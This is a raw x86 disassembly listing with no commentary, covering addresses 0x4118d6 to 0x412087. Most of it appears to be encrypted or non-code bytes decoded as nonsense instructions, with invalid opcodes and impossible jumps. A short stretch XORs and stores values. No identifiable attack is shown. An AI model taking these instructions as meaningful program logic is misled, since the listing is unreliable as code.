  4118d6:	xor    eax,0x453b7398
  4118db:	fist   DWORD PTR [edx+eax*8-0x75]
  4118df:	jne    0x4118e9
  4118e1:	add    BYTE PTR [eax],bl
  4118e3:	daa    
  4118e4:	int3   
  4118e5:	rcl    DWORD PTR [esi],cl
  4118e7:	idiv   BYTE PTR [ebx]
  4118e9:	xchg   ecx,eax
  4118ea:	out    0x3b,al
  4118ec:	pop    ds
  4118ed:	mov    ?,WORD PTR [ebp+0x3beffd9a]
  4118f3:	daa    
  4118f4:	inc    ebx
  4118f5:	mov    esi,0x48592cde
  4118fa:	and    dl,BYTE PTR [edx+0x8]
  4118fd:	mov    ebx,0x3707299a
  411902:	pop    eax
  411903:	out    0x3e,al
  411905:	aad    0x17
  411907:	ja     0x411957
  411909:	and    DWORD PTR [edi+0x67],edi
  41190c:	pop    es
  41190d:	push   0x37
  41190f:	cmp    al,0x66
  411911:	xor    eax,0xd0c1220f
  411916:	ret    
  411917:	push   ebx
  411918:	mov    BYTE PTR [eax],bl
  41191a:	fadd   QWORD PTR [edi]
  41191c:	xchg   edx,eax
  41191d:	fbld   TBYTE PTR [ecx-0x2a]
  411920:	in     eax,dx
  411921:	xchg   esi,eax
  411922:	sti    
  411923:	call   0x405fc6dc
  411928:	sub    cl,ah
  41192a:	fs pop edi
  41192c:	cmp    al,al
  41192e:	imul   esi,ebp,0xffffff84
  411931:	mov    ds:0x566a0c6f,al
  411936:	mov    edx,0x9fcbdcc3
  41193b:	xchg   ebp,eax
  41193c:	xchg   ebp,eax
  41193d:	aam    0x58
  41193f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411940:	sbb    BYTE PTR [edi],ah
  411942:	sub    BYTE PTR [eax+0x3f5c2f15],ah
  411948:	rol    BYTE PTR [eax-0x53],1
  41194b:	push   0xffffffd5
  41194d:	pop    es
  41194e:	aaa    
  41194f:	stos   DWORD PTR es:[edi],eax
  411950:	jae    0x41198d
  411952:	mov    ds:0x8883a282,al
  411957:	imul   ebx,esp,0x50
  41195a:	xchg   ebp,eax
  41195b:	cmp    bl,dl
  41195d:	jmp    0xeced2403
  411962:	or     eax,0xe7861ff8
  411967:	add    bh,BYTE PTR [eax-0x5]
  41196a:	mov    edi,0xd97832f0
  41196f:	dec    ecx
  411970:	js     0x411926
  411972:	push   ecx
  411973:	xchg   edi,eax
  411974:	addr16 mov bh,0xa9
  411977:	jmp    0xb48f:0xb310af23
  41197e:	pop    ebp
  41197f:	(bad)  
  411980:	aam    0xb7
  411982:	pushf  
  411983:	push   eax
  411984:	fsubr  st,st(3)
  411986:	enter  0x61d8,0x5f
  41198a:	clc    
  41198b:	mov    ds:0xdb990382,al
  411990:	mov    BYTE PTR [edx+0x1],ah
  411993:	jp     0x411969
  411995:	sbb    WORD PTR [edi-0x56455ef6],ax
  41199c:	adc    ah,BYTE PTR [eax-0x53b5dc14]
  4119a2:	adc    eax,0xaf987959
  4119a7:	cmovle esp,edx
  4119aa:	mov    ds:0xc321f2ec,al
  4119af:	jns    0x4119be
  4119b1:	adc    eax,0x6be27b39
  4119b6:	jb     0x411982
  4119b8:	fs enter 0x91e4,0xea
  4119bd:	add    al,0x21
  4119bf:	ret    0x402c
  4119c2:	loope  0x411989
  4119c4:	fsub   DWORD PTR [edx]
  4119c6:	lods   al,BYTE PTR ds:[esi]
  4119c7:	ja     0x4119d1
  4119c9:	out    dx,eax
  4119ca:	(bad)  
  4119cb:	in     eax,dx
  4119cc:	cmp    eax,0xc12f57c8
  4119d1:	icebp  
  4119d2:	ins    BYTE PTR es:[edi],dx
  4119d3:	rcl    edx,1
  4119d5:	xlat   BYTE PTR ds:[ebx]
  4119d6:	xchg   ebp,eax
  4119d7:	xchg   BYTE PTR [edx+0x3b1bdb6f],al
  4119dd:	mov    bh,0x85
  4119df:	push   edi
  4119e0:	push   esp
  4119e1:	add    eax,0x13975eef
  4119e6:	(bad)  
  4119e7:	push   ebx
  4119e8:	cld    
  4119e9:	mov    BYTE PTR ds:0x780da44c,bl
  4119ef:	and    eax,0xb48a355
  4119f4:	enter  0x28c0,0xf4
  4119f8:	sbb    ah,BYTE PTR [edi]
  4119fa:	mov    edx,0x2cacdce6
  4119ff:	aaa    
  411a00:	adc    al,0xc5
  411a02:	pop    ds
  411a03:	les    edx,FWORD PTR [ebx+0x4e9eb4fa]
  411a09:	retf   
  411a0a:	sub    cl,BYTE PTR [edx-0x2d]
  411a0d:	ins    BYTE PTR es:[edi],dx
  411a0e:	jnp    0x411a6e
  411a10:	leave  
  411a11:	js     0x411a0c
  411a13:	imul   esi,DWORD PTR [esi-0x778c7de5],0xef58f75c
  411a1d:	sub    BYTE PTR [ebp+eiz*4-0x4],0x13
  411a22:	push   edx
  411a23:	pushf  
  411a24:	fistp  WORD PTR [esi-0x79]
  411a27:	pop    ebp
  411a28:	inc    esi
  411a29:	xlat   BYTE PTR ds:[ebx]
  411a2a:	or     BYTE PTR [ecx],cl
  411a2c:	fst    DWORD PTR [ebx]
  411a2e:	xchg   ebp,eax
  411a2f:	sti    
  411a30:	test   DWORD PTR [eax-0x288b1d88],esi
  411a36:	sbb    eax,0x1b602bed
  411a3b:	push   cs
  411a3c:	xchg   edi,eax
  411a3d:	push   ecx
  411a3e:	daa    
  411a3f:	mov    ds:0x4ad69bca,al
  411a44:	inc    esi
  411a45:	dec    ebx
  411a46:	mov    al,ds:0x9323087a
  411a4b:	(bad)  
  411a4d:	sar    DWORD PTR [edx-0x26820f33],1
  411a53:	xor    eax,0xfd2357ed
  411a58:	into   
  411a59:	test   al,0xf5
  411a5b:	inc    edx
  411a5c:	pop    ss
  411a5d:	sub    ebx,DWORD PTR [eax-0x6bdda005]
  411a63:	and    eax,0xcc5ce4de
  411a68:	cdq    
  411a69:	lea    esi,[esi]
  411a6b:	mov    ch,0x41
  411a6d:	sbb    al,0x2e
  411a6f:	imul   esi,DWORD PTR [eax-0x10],0x424f713e
  411a76:	push   es
  411a77:	out    dx,al
  411a78:	leave  
  411a79:	jmp    0x411a2b
  411a7b:	hlt    
  411a7c:	push   ebp
  411a7d:	dec    esi
  411a7e:	sub    eax,0x9b5bc224
  411a83:	push   es
  411a84:	aaa    
  411a85:	pop    ss
  411a86:	mov    ebx,DWORD PTR [esi+0x32]
  411a89:	jg     0x411ae2
  411a8b:	stos   BYTE PTR es:[edi],al
  411a8c:	arpl   WORD PTR [esi+0x68b0400a],di
  411a92:	outs   dx,BYTE PTR ds:[esi]
  411a93:	loopne 0x411a8c
  411a95:	pop    esp
  411a96:	and    ecx,DWORD PTR [ebx+0x6a]
  411a99:	mov    ecx,0x7283369b
  411a9e:	addr16 push esp
  411aa0:	mov    ebp,0x380f4c68
  411aa5:	sar    ebp,0xed
  411aa8:	loope  0x411aac
  411aaa:	xlat   BYTE PTR ds:[ebx]
  411aab:	xchg   esi,eax
  411aac:	jo     0x411ae0
  411aae:	icebp  
  411aaf:	mov    cl,dh
  411ab1:	mov    esi,0x82d8f03c
  411ab6:	ror    BYTE PTR [ebx+0x76c480c1],1
  411abc:	hlt    
  411abd:	addr16 (bad) 
  411abf:	jbe    0x411a8a
  411ac1:	pop    ebx
  411ac2:	iret   
  411ac3:	lods   al,BYTE PTR ds:[esi]
  411ac4:	iret   
  411ac5:	push   ebx
  411ac6:	sbb    ah,bl
  411ac8:	xchg   esi,eax
  411ac9:	adc    BYTE PTR [ebx+0x8],cl
  411acc:	and    ah,BYTE PTR [edi]
  411ace:	sbb    eax,0x7914a080
  411ad3:	add    ebx,DWORD PTR [ebp+0x20]
  411ad6:	(bad)  
  411ad7:	fisttp QWORD PTR [ebx]
  411ad9:	push   ss
  411ada:	mov    esp,ebp
  411adc:	lds    ebx,FWORD PTR [esi+0x6b1148b9]
  411ae2:	add    ch,BYTE PTR [ebp+0x3dc202a3]
  411ae8:	mov    esp,0x4a18e485
  411aed:	aad    0x3c
  411aef:	or     dl,BYTE PTR [edx]
  411af1:	push   edx
  411af2:	push   ss
  411af3:	scas   eax,DWORD PTR es:[edi]
  411af4:	aaa    
  411af5:	push   ss
  411af6:	dec    esi
  411af7:	add    DWORD PTR [edi],0x87bc0975
  411afd:	clc    
  411afe:	mov    bl,0xac
  411b00:	les    edi,FWORD PTR [ebp+0x66]
  411b03:	cmp    DWORD PTR [ecx],0x6a
  411b06:	ss fwait
  411b08:	sti    
  411b09:	add    DWORD PTR [edx-0x4b612e56],edi
  411b0f:	adc    eax,0x82b18e74
  411b14:	xlat   BYTE PTR ds:[ebx]
  411b15:	pop    esp
  411b16:	imul   ebp,DWORD PTR [esi],0x4b1a21b1
  411b1c:	xor    eax,0x60155921
  411b21:	leave  
  411b22:	cmp    cl,BYTE PTR [eax]
  411b24:	add    DWORD PTR [edi+0x3afbace9],0xffffff98
  411b2b:	pusha  
  411b2c:	stc    
  411b2d:	jmp    0xf00:0xa1bc3bd7
  411b34:	in     eax,dx
  411b35:	push   es
  411b36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b37:	xchg   BYTE PTR [ebx-0x3f],dh
  411b3a:	and    ebp,DWORD PTR [edx+esi*2+0x70a50b92]
  411b41:	mov    ch,0xcc
  411b43:	sub    eax,0x73f4e160
  411b48:	jle    0x411b6c
  411b4a:	retf   0xa971
  411b4d:	mov    cl,0x73
  411b4f:	fadd   QWORD PTR [esi-0x1d983bd1]
  411b55:	daa    
  411b56:	int    0xa3
  411b58:	scas   al,BYTE PTR es:[edi]
  411b59:	retf   0xad08
  411b5c:	sti    
  411b5d:	dec    ecx
  411b5e:	or     al,bl
  411b60:	stos   BYTE PTR es:[edi],al
  411b61:	add    esp,DWORD PTR [edi+0x18aa589]
  411b67:	outs   dx,BYTE PTR ds:[esi]
  411b68:	jmp    0xd66e:0xe93f7d2d
  411b6f:	xor    al,0x6
  411b71:	add    BYTE PTR [esp+edi*4],0x5b
  411b75:	retf   
  411b76:	(bad)  
  411b77:	ss into 
  411b79:	push   edx
  411b7a:	inc    esp
  411b7b:	gs out dx,al
  411b7d:	xchg   ecx,eax
  411b7e:	push   edi
  411b7f:	dec    ebp
  411b80:	stc    
  411b81:	push   edx
  411b82:	stos   BYTE PTR es:[edi],al
  411b83:	pop    edx
  411b84:	int    0x97
  411b86:	xor    eax,0x73edbba6
  411b8b:	mov    BYTE PTR [ebp-0x6f],ch
  411b8e:	loop   0x411b2a
  411b90:	jnp    0x411b34
  411b92:	or     cl,BYTE PTR [edx+0x20414a76]
  411b98:	mov    esi,0xc3979a2c
  411b9d:	push   0xf5345e7a
  411ba2:	test   BYTE PTR [esi],0x96
  411ba5:	sti    
  411ba6:	or     BYTE PTR [edi+eax*4],bl
  411ba9:	add    eax,0x646c5e05
  411bae:	fstp   QWORD PTR [edx+0x77086368]
  411bb4:	sub    BYTE PTR [edi],cl
  411bb6:	or     DWORD PTR [eax-0x329d4804],0x4e
  411bbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411bbe:	jne    0x411c27
  411bc0:	push   edx
  411bc1:	rcl    DWORD PTR [edx],1
  411bc3:	mov    eax,ds:0x1988ecdb
  411bc8:	cwde   
  411bc9:	ins    BYTE PTR es:[edi],dx
  411bca:	test   DWORD PTR [ecx],ebx
  411bcc:	push   edx
  411bcd:	icebp  
  411bce:	sub    bl,cl
  411bd0:	and    BYTE PTR [edx+0x22],al
  411bd3:	xchg   ebp,eax
  411bd4:	push   ss
  411bd5:	or     al,0x51
  411bd7:	dec    edi
  411bd8:	inc    edx
  411bd9:	lods   al,BYTE PTR ds:[esi]
  411bda:	cmp    ch,BYTE PTR [edi+0x396e624c]
  411be0:	xchg   ecx,eax
  411be1:	push   0xf08c801e
  411be6:	mov    BYTE PTR [ebx],0x84
  411be9:	adc    BYTE PTR [ebp+0x7d],ch
  411bec:	xchg   DWORD PTR [esi],ebp
  411bee:	test   dl,0xc7
  411bf1:	and    eax,0x8ba5469d
  411bf6:	mov    ch,0x7f
  411bf8:	ins    DWORD PTR es:[edi],dx
  411bf9:	mov    BYTE PTR [ecx+eiz*1],cl
  411bfc:	pop    edi
  411bfd:	sbb    eax,0x1e002975
  411c02:	pushf  
  411c03:	jle    0x411bfa
  411c05:	xor    DWORD PTR [eax+eax*8],ebx
  411c08:	jne    0x411bc5
  411c0a:	adc    al,0x6
  411c0c:	sub    ecx,DWORD PTR [ecx]
  411c0e:	mov    esp,esi
  411c10:	lods   eax,DWORD PTR ds:[esi]
  411c11:	cmp    eax,0xba605818
  411c16:	imul   ebx,DWORD PTR [esi+0x10],0xffffffc0
  411c1a:	fsubr  DWORD PTR [edx-0x4a]
  411c1d:	call   0xab207376
  411c22:	popa   
  411c23:	call   0x1abb:0x90738371
  411c2a:	fwait
  411c2b:	xor    eax,0xefa97e58
  411c30:	mov    edi,0xe269231d
  411c35:	push   edx
  411c36:	test   eax,0x4044d584
  411c3b:	or     ebp,DWORD PTR [ebx]
  411c3d:	cmp    eax,0x690ebd36
  411c42:	dec    edx
  411c43:	rcl    BYTE PTR [edx+0x7f],0xff
  411c47:	pop    ss
  411c48:	jnp    0x411cc9
  411c4a:	shl    DWORD PTR [edi],1
  411c4c:	mov    bl,BYTE PTR [ebp+0x4bb79244]
  411c52:	lahf   
  411c53:	lods   al,BYTE PTR ds:[esi]
  411c54:	cli    
  411c55:	push   esi
  411c56:	inc    esi
  411c57:	inc    eax
  411c58:	sub    ch,BYTE PTR [edi+edx*8]
  411c5b:	stc    
  411c5c:	or     al,0xcb
  411c5e:	ins    DWORD PTR es:[edi],dx
  411c5f:	mov    ch,0xa4
  411c61:	clc    
  411c62:	add    BYTE PTR [ebx],ch
  411c64:	dec    esp
  411c65:	lods   eax,DWORD PTR ds:[esi]
  411c66:	(bad)  [esi+0x61]
  411c69:	popa   
  411c6a:	dec    eax
  411c6b:	mov    WORD PTR [ebp+0x41b22ca1],es
  411c71:	add    BYTE PTR [ebx],al
  411c73:	add    eax,0x41b224
  411c78:	jmp    0x411c84
  411c7d:	mov    eax,DWORD PTR [ebp+0xc]
  411c80:	xor    eax,ecx
  411c82:	add    eax,edx
  411c84:	mov    ds:0x41b224,eax
  411c89:	mov    eax,DWORD PTR [ebp+0xc]
  411c8c:	xor    eax,ecx
  411c8e:	add    eax,edx
  411c90:	mov    ds:0x41b22c,eax
  411c95:	jmp    0x4120a9
  411c9a:	mov    eax,ds:0x41b22c
  411c9f:	mov    ds:0x41b224,eax
  411ca4:	jmp    0x4120a9
  411ca9:	mov    dh,0x72
  411cab:	cwde   
  411cac:	test   al,0x64
  411cae:	jb     0x411c66
  411cb0:	jb     0x411ca3
  411cb2:	xchg   ecx,eax
  411cb3:	adc    eax,0xb878cf5e
  411cb8:	adc    ebx,DWORD PTR [esi+0x53]
  411cbb:	jo     0x411d2d
  411cbd:	pop    eax
  411cbe:	jge    0x411d30
  411cc0:	jo     0x411caa
  411cc2:	test   DWORD PTR [ebx],0x3618ab19
  411cc8:	xchg   esi,eax
  411cc9:	mov    al,0xd3
  411ccb:	rcl    BYTE PTR [esi-0xd4fe297],cl
  411cd1:	inc    edi
  411cd2:	cdq    
  411cd3:	mov    esi,ds
  411cd5:	mov    esp,0x4f393f8e
  411cda:	sbb    eax,0xec323e52
  411cdf:	mov    BYTE PTR [ebx-0x7a],bh
  411ce2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ce3:	dec    ecx
  411ce4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ce5:	jne    0x411d41
  411ce7:	js     0x411d42
  411ce9:	lock pop es
  411ceb:	pop    ds
  411cec:	mov    ds:0x79f7f7f6,eax
  411cf1:	loope  0x411c8b
  411cf3:	mov    WORD PTR [edx],?
  411cf5:	ins    BYTE PTR es:[edi],dx
  411cf6:	add    DWORD PTR [ebx],ebp
  411cf8:	(bad)  
  411cfa:	out    0xb7,eax
  411cfc:	mov    al,ds:0x67e88e0c
  411d01:	dec    esp
  411d02:	ficomp WORD PTR [esi+ebp*4+0x7ec2b544]
  411d09:	inc    ebx
  411d0a:	xchg   DWORD PTR [edx],esi
  411d0c:	rol    DWORD PTR [bx+di],0xd4
  411d10:	scas   al,BYTE PTR es:[edi]
  411d11:	xchg   edx,eax
  411d12:	(bad)  
  411d13:	sub    cl,dh
  411d15:	int3   
  411d16:	popf   
  411d17:	(bad)  
  411d18:	push   ebx
  411d19:	repz in eax,0x9a
  411d1c:	and    DWORD PTR [esi],ecx
  411d1e:	setge  al
  411d21:	ja     0x411cab
  411d23:	mov    ch,0x31
  411d25:	cmpxchg DWORD PTR [esi+0x49],esp
  411d29:	sub    eax,0x3731137a
  411d2e:	dec    ebp
  411d2f:	in     eax,0xc2
  411d31:	push   edi
  411d32:	div    DWORD PTR [edx-0x1b]
  411d35:	inc    esp
  411d36:	shl    BYTE PTR [ecx],cl
  411d38:	pop    ds
  411d39:	(bad)  
  411d3b:	scas   al,BYTE PTR es:[edi]
  411d3c:	in     eax,0xd8
  411d3e:	(bad)  
  411d3f:	push   eax
  411d40:	or     al,0x1c
  411d42:	scas   eax,DWORD PTR es:[edi]
  411d43:	jge    0x411d73
  411d45:	retf   
  411d46:	push   ebp
  411d47:	push   edx
  411d48:	inc    edx
  411d49:	ss xchg edi,eax
  411d4b:	push   0x6e
  411d4d:	push   ss
  411d4e:	xchg   esp,eax
  411d4f:	xlat   BYTE PTR ds:[ebx]
  411d50:	sbb    DWORD PTR [esi],0x4b
  411d53:	aaa    
  411d54:	adc    BYTE PTR [eax-0x4b],0x36
  411d58:	leave  
  411d59:	daa    
  411d5a:	push   ss
  411d5b:	mov    ah,0xbd
  411d5d:	inc    edi
  411d5e:	es pushf 
  411d60:	sub    al,0xdc
  411d62:	idiv   DWORD PTR [edx]
  411d64:	and    esi,ecx
  411d66:	cld    
  411d67:	xchg   edx,eax
  411d68:	mov    edi,0xf4c7b3d
  411d6d:	push   eax
  411d6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d6f:	shr    DWORD PTR [edx-0x71c7dafd],cl
  411d75:	loope  0x411de5
  411d77:	icebp  
  411d78:	pop    edx
  411d79:	mov    cs,WORD PTR [esi-0x20]
  411d7c:	mov    bl,0x31
  411d7e:	xchg   esi,eax
  411d7f:	jne    0x411d96
  411d81:	(bad)  
  411d82:	push   ebp
  411d83:	or     dh,dh
  411d85:	add    dl,BYTE PTR [ecx-0x55]
  411d88:	sbb    BYTE PTR [esi-0x48],bl
  411d8b:	call   0xc90757d2
  411d90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d91:	and    al,0x7
  411d93:	inc    ecx
  411d94:	int    0x25
  411d96:	cdq    
  411d97:	dec    eax
  411d98:	loop   0x411e0f
  411d9a:	xchg   BYTE PTR [esi+ebp*8+0x5e],ch
  411d9e:	aad    0x95
  411da0:	push   es
  411da1:	sub    al,0xee
  411da3:	gs mov bh,0x28
  411da6:	test   al,0x50
  411da8:	(bad)  
  411da9:	adc    ebx,esp
  411dab:	xchg   edx,eax
  411dac:	pop    ebx
  411dad:	xchg   ecx,eax
  411dae:	cmp    esp,esi
  411db0:	mov    WORD PTR [edx+0x63],?
  411db3:	or     eax,0xe19df44b
  411db8:	scas   al,BYTE PTR es:[edi]
  411db9:	lahf   
  411dba:	sub    eax,0xf4594b6f
  411dbf:	outs   dx,DWORD PTR ds:[esi]
  411dc0:	dec    eax
  411dc1:	bound  ebp,QWORD PTR [edx-0x21]
  411dc4:	shr    esp,0xc6
  411dc7:	lods   eax,DWORD PTR ds:[esi]
  411dc8:	mov    eax,0xdcd21d29
  411dcd:	add    bh,cl
  411dcf:	sub    al,0x92
  411dd1:	xchg   ebx,eax
  411dd2:	push   edi
  411dd3:	jo     0x411df7
  411dd5:	mov    al,0xf8
  411dd7:	mov    esi,0xdd5e9ab2
  411ddc:	inc    esp
  411ddd:	push   esp
  411dde:	cli    
  411ddf:	aad    0x39
  411de1:	retf   
  411de2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411de3:	cmc    
  411de4:	fnsave [ecx]
  411de6:	jg     0x411de3
  411de8:	sbb    ch,BYTE PTR [esi]
  411dea:	push   0x68c513c5
  411def:	push   ebx
  411df0:	repnz or eax,0xf94576f3
  411df6:	retf   0xfd57
  411df9:	ss jbe 0x411e4d
  411dfc:	mov    edi,0xf6fb7e09
  411e01:	clc    
  411e02:	jl     0x411e44
  411e04:	jo     0x411e2e
  411e06:	pop    ss
  411e07:	call   0x8247668a
  411e0c:	shr    esi,1
  411e0e:	xchg   ecx,eax
  411e0f:	inc    edi
  411e10:	sub    BYTE PTR [ebp-0x68],dh
  411e13:	adc    DWORD PTR [edi-0x7e479ebe],edi
  411e19:	scas   al,BYTE PTR es:[edi]
  411e1a:	mov    ebx,edi
  411e1c:	bound  ebp,QWORD PTR [ebx+0x68]
  411e1f:	push   cs
  411e20:	fistp  QWORD PTR [ebp+0x2f]
  411e23:	ds aad 0x9e
  411e26:	sub    dh,ch
  411e28:	push   cs
  411e29:	pop    ebp
  411e2a:	xchg   ebx,eax
  411e2b:	add    al,0x94
  411e2d:	ret    
  411e2e:	pop    ecx
  411e2f:	mov    ecx,0x9b0094c1
  411e34:	adc    edi,DWORD PTR [esi]
  411e36:	sbb    DWORD PTR [ebx+0x32a663c1],edx
  411e3c:	mov    esi,0x7171d5e1
  411e41:	andnps xmm1,XMMWORD PTR [ebx+0x5f]
  411e45:	cs push edi
  411e47:	mov    al,0x92
  411e49:	sub    ah,BYTE PTR [edi-0x4fa7d9dc]
  411e4f:	push   ebp
  411e50:	repz sbb eax,0xe22aeb98
  411e56:	add    al,0x6a
  411e58:	dec    eax
  411e59:	mov    bl,0x2a
  411e5b:	cwde   
  411e5c:	adc    BYTE PTR [ebx],dh
  411e5e:	xor    esp,esp
  411e60:	sub    DWORD PTR [ecx],ebx
  411e62:	cwde   
  411e63:	daa    
  411e64:	pop    edi
  411e65:	jmp    0x4b0bfab2
  411e6a:	test   BYTE PTR [eax-0x38a4d97d],bl
  411e70:	pop    es
  411e71:	ror    DWORD PTR [edi+0x5cd192a5],cl
  411e77:	push   esi
  411e78:	lock jge 0x411eaf
  411e7b:	ja     0x5c4deddb
  411e81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e82:	je     0x411ed2
  411e84:	push   edx
  411e85:	mov    cl,0xc7
  411e87:	imul   ebx,edi,0x38b10be8
  411e8d:	push   ds
  411e8e:	mov    DWORD PTR ds:0x8672100e,esp
  411e94:	jnp    0x411eda
  411e96:	outs   dx,BYTE PTR ds:[esi]
  411e97:	cmc    
  411e98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e99:	hlt    
  411e9a:	cmp    BYTE PTR [esi-0x44159f1a],bh
  411ea0:	mov    ?,WORD PTR [edx-0x35760a81]
  411ea6:	jns    0x411e2e
  411ea8:	(bad)  
  411ea9:	adc    ah,dh
  411eab:	aam    0xac
  411ead:	ins    BYTE PTR es:[edi],dx
  411eae:	dec    ecx
  411eaf:	(bad)  
  411eb0:	jmp    0x134135bf
  411eb5:	add    eax,0x715495cd
  411eba:	push   0xe8c550d0
  411ebf:	dec    edi
  411ec0:	push   esi
  411ec1:	(bad)  
  411ec2:	jo     0x411e70
  411ec4:	jg     0x411ecc
  411ec6:	outs   dx,BYTE PTR ds:[esi]
  411ec7:	(bad)  [edx+0x76b518e]
  411ecd:	ins    DWORD PTR es:[edi],dx
  411ece:	adc    BYTE PTR [ebp-0x60],bl
  411ed1:	adc    BYTE PTR [ecx+ecx*2-0x5e350e4d],0x79
  411ed9:	adc    eax,0x4bf19289
  411ede:	xor    eax,0xffffff96
  411ee1:	and    BYTE PTR [ebx],0x81
  411ee4:	push   esi
  411ee5:	iret   
  411ee6:	test   ecx,0xece38104
  411eec:	outs   dx,BYTE PTR ds:[esi]
  411eed:	bsr    edx,ecx
  411ef0:	sub    DWORD PTR [ebx],edi
  411ef2:	dec    ecx
  411ef3:	adc    al,0x8d
  411ef5:	jns    0x411f5d
  411ef7:	xchg   ebx,eax
  411ef8:	out    dx,eax
  411ef9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411efa:	and    dh,bl
  411efc:	pop    edx
  411efd:	test   al,0x6f
  411eff:	jne    0x411e88
  411f01:	or     al,0xac
  411f03:	jg     0x411eca
  411f05:	add    esi,DWORD PTR ds:0xb10756c7
  411f0b:	in     al,0x2f
  411f0d:	or     al,0x17
  411f0f:	mov    edx,0x8163697a
  411f14:	lock shl DWORD PTR [ecx+0x14],cl
  411f18:	test   eax,0x57fed66d
  411f1d:	(bad)  
  411f1e:	mov    ?,WORD PTR [edx+edi*8+0x1a]
  411f22:	adc    dh,BYTE PTR ds:0xa961aca
  411f28:	cld    
  411f29:	cmp    BYTE PTR [ebp-0x3776c90f],al
  411f2f:	jns    0x411f67
  411f31:	mov    ebx,0x981e1b86
  411f36:	sub    BYTE PTR [edi-0x2eeb2f30],bh
  411f3c:	test   DWORD PTR cs:[ecx],edi
  411f3f:	fldcw  WORD PTR [ecx]
  411f41:	scas   al,BYTE PTR es:[edi]
  411f42:	in     al,0xab
  411f44:	daa    
  411f45:	sti    
  411f46:	cdq    
  411f47:	call   0xebf0:0x5fd83f39
  411f4e:	sub    esp,edx
  411f50:	pop    ss
  411f51:	nop
  411f52:	out    0x25,al
  411f54:	sbb    cl,BYTE PTR [edx]
  411f56:	jne    0x411f5f
  411f58:	mov    ecx,0xb568c563
  411f5d:	popf   
  411f5e:	xor    ecx,DWORD PTR [eax-0x57]
  411f61:	inc    edx
  411f62:	cli    
  411f63:	(bad)  [esi+0x5b]
  411f66:	leave  
  411f67:	jp     0x411ef6
  411f69:	in     al,0x55
  411f6b:	xor    edi,DWORD PTR [edx+0x47]
  411f6e:	shl    DWORD PTR [esi+0x5636519],0xab
  411f75:	dec    edi
  411f76:	inc    edi
  411f77:	jl     0x411f67
  411f79:	fmul   DWORD PTR [edx-0x6d]
  411f7c:	int    0xd3
  411f7e:	shl    DWORD PTR [esi+0x7],cl
  411f81:	pop    ds
  411f82:	sub    esi,ebp
  411f84:	fnstenv [edi]
  411f86:	mov    bh,BYTE PTR [esi+0x176c3e0d]
  411f8c:	mov    ch,0x7f
  411f8e:	push   edx
  411f8f:	rol    BYTE PTR [esi-0x6a149b7b],cl
  411f95:	or     bh,BYTE PTR [esi-0x4d]
  411f98:	mov    bl,BYTE PTR [ebp+ebp*4-0x5dd71ab4]
  411f9f:	and    eax,0x52bc8f81
  411fa4:	aaa    
  411fa5:	inc    eax
  411fa6:	fs and al,0xdc
  411fa9:	xor    al,0x8e
  411fab:	hlt    
  411fac:	and    DWORD PTR [ecx+0x3b],esp
  411faf:	inc    edi
  411fb0:	outs   dx,BYTE PTR ds:[esi]
  411fb1:	scas   eax,DWORD PTR es:[edi]
  411fb2:	xlat   BYTE PTR ds:[ebx]
  411fb3:	and    eax,0x220749f9
  411fb8:	mov    eax,ds:0xb50ee712
  411fbd:	adc    bl,BYTE PTR [edx+0x3a180cf3]
  411fc3:	ret    
  411fc4:	dec    ecx
  411fc5:	scas   al,BYTE PTR es:[edi]
  411fc6:	in     al,0x85
  411fc8:	fwait
  411fc9:	pop    ss
  411fca:	sub    al,0x2
  411fcc:	add    ecx,DWORD PTR [ecx]
  411fce:	xchg   esi,eax
  411fcf:	and    al,0x57
  411fd1:	adc    eax,DWORD PTR [edi-0x1d18b339]
  411fd7:	push   eax
  411fd8:	adc    dl,BYTE PTR [ecx+0x6d]
  411fdb:	push   ss
  411fdc:	xchg   BYTE PTR [ecx-0x63],bh
  411fdf:	imul   edx,DWORD PTR [edi+0x5a],0x81d0017f
  411fe6:	mov    ds,WORD PTR [ebx]
  411fe8:	cmp    esi,DWORD PTR [eax-0x578d1008]
  411fee:	xor    al,BYTE PTR [ebx]
  411ff0:	mov    al,ds:0x6d62fee1
  411ff5:	mov    bl,0x9c
  411ff7:	imul   eax,DWORD PTR [eax+0x199a1507],0xffffffdb
  411ffe:	jecxz  0x412044
  412000:	mov    edi,0x6ad47afa
  412005:	dec    BYTE PTR ds:0x8a921039
  41200b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41200c:	scas   eax,DWORD PTR es:[edi]
  41200d:	xor    ch,ch
  41200f:	mov    edi,0xf1608f19
  412014:	xchg   ebp,eax
  412015:	jecxz  0x412062
  412017:	jmp    0xca1ba175
  41201c:	mov    ebx,0xcc9b0269
  412021:	loopne 0x411fc4
  412023:	and    al,0xba
  412025:	fwait
  412026:	lock icebp 
  412028:	out    dx,al
  412029:	das    
  41202a:	stc    
  41202b:	aam    0x50
  41202d:	or     eax,0x1974135a
  412032:	mov    eax,0x37f71bb5
  412037:	sbb    al,0xde
  412039:	sti    
  41203a:	test   DWORD PTR [eax+0x7a],esp
  41203d:	popf   
  41203e:	jns    0x411ff3
  412040:	push   0x35
  412042:	jge    0x41207a
  412044:	add    edx,esp
  412046:	fidiv  WORD PTR [edi]
  412048:	push   eax
  412049:	lods   eax,DWORD PTR ds:[esi]
  41204a:	in     eax,0xb9
  41204c:	or     eax,0x6471e48d
  412051:	imul   ebx,DWORD PTR [eax],0x2981df61
  412057:	and    eax,0xe7b29d0b
  41205c:	add    eax,0xb1e09d57
  412061:	push   ebp
  412062:	faddp  st(1),st
  412064:	mov    dh,0x45
  412066:	es dec esp
  412068:	or     DWORD PTR [ebx+0x6b0dfd7d],0xda080bf1
  412072:	xchg   esi,eax
  412073:	ja     0x4120de
  412075:	stc    
  412076:	xchg   ebp,eax
  412077:	fdiv   QWORD PTR fs:[edi+edi*8-0x3501266]
  41207f:	xchg   ebp,eax
  412080:	add    ebx,DWORD PTR [esi+0x1d2fd3e]
  412086:	inc    eax
  412087:	or     DWORD PTR ds:[esi],ebx
